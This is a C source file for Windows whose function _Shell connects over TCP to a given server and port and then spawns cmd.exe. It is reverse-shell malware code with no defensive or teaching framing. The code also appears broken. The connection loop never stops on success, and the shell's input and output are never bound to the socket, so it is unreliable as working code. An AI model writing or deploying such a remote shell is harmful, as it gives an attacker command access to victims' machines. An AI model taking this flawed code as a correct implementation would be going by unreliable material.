#include "shell.h"

void _Shell(const char *server, const char *port)
{
    int ret;
    WSADATA wsaData;
    SOCKET sock;
    
    struct addrinfo *result = NULL, *ptr = NULL, hints;

    if((ret = WSAStartup(MAKEWORD(2,2), &wsaData))) ExitProcess(ret);

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    
    if((ret = getaddrinfo(server, port, &hints, &result))){
        WSACleanup();
        ExitProcess(ret);
    }

    for(ptr = result; ptr; ptr = ptr->ai_next){
        sock = socket(ptr->ai_family,
                      ptr->ai_socktype,
                      ptr->ai_protocol);

        if(sock == INVALID_SOCKET){
            WSACleanup();
            ExitProcess(123);
        }

        if(connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen)){
            closesocket(sock);
            sock = INVALID_SOCKET;
            continue;
        }
    }

    freeaddrinfo(result);

    PROCESS_INFORMATION proc_info;
    STARTUPINFO start_info;
    
    start_info.cb = sizeof(STARTUPINFO);
    
    start_info.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);
    start_info.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
    start_info.hStdError  = GetStdHandle(STD_ERROR_HANDLE);

    CreateProcess("C:/Windows/System32/cmd.exe",
                  NULL,
                  NULL,
                  NULL,
                  FALSE,
                  NORMAL_PRIORITY_CLASS,
                  NULL,
                  NULL,
                  &start_info,
                  &proc_info
                  );
    
}













